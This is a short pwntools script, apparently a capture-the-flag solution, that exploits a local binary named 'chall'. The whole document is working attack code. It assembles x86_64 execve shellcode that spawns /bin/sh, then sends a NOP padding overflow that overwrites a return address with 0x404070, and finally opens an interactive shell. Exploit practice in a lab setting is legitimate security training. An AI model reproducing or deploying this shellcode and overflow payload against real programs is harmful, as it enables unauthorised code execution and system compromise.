from pwn import *
context.log_level="DEBUG"
context.arch = 'x86_64'

r = process("./chall")
r.recv()

assembly = asm("""
xor     rdx, rdx
mov     rbx, 0x68732f6e69622f2f
push    rbx
mov     rdi, rsp
xor     rsi, rsi
mov     rax, 59
syscall
""")

r.sendline(assembly)
r.recv()
r.sendline(b'\x90'*40 + p64(0x404070))
r.interactive()
